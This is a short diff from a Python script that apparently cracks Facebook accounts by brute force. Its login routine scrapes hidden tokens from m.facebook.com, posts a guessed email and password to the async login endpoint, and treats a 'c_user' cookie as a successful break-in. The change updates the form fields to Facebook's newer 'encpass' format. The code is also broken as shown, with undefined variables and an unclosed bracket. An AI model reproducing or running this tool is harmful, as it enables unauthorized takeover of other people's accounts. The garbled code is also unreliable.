@@ -1227,18 +1227,12 @@ def m6(idf,pwv):
    session = requests.Session()
    pro = random.choice(ugen)
    free_fb = session.get('https://m.facebook.com').text
-   log_data = {"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-   "charset_test":re.search('name="charset_test" value="(.*?)"', str(free_fb)).group(1),
-   "version":re.search('name="version" value="(.*?)"', str(free_fb)).group(1),
-   "ajax":re.search('name="ajax" value="(.*?)"', str(free_fb)).group(1),
-   "width":re.search('name="width" value="(.*?)"', str(free_fb)).group(1),
-   "pxr":re.search('name="pxr" value="(.*?)"', str(free_fb)).group(1),
-   "gps":re.search('name="gps" value="(.*?)"', str(free_fb)).group(1),
-   "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-   "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-   "email":idf,
-   "pass":pw,
-   "login":"Log In"} 
+   log_data ={'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
+            'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
+            'email': idf,
+            'login_source': 'comet_headerless_login',
+            'next': 'https://m.facebook.com/login/device-based/regular/login',
+            'encpass': '#PWD_BROWSER:5:{}:{}'.format(re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),ps,} 
    lo = session.post('https://m.facebook.com/login/device-based/login/async/',data=log_data).text
    log_cookies=session.cookies.get_dict().keys()
    if 'c_user' in log_cookies:
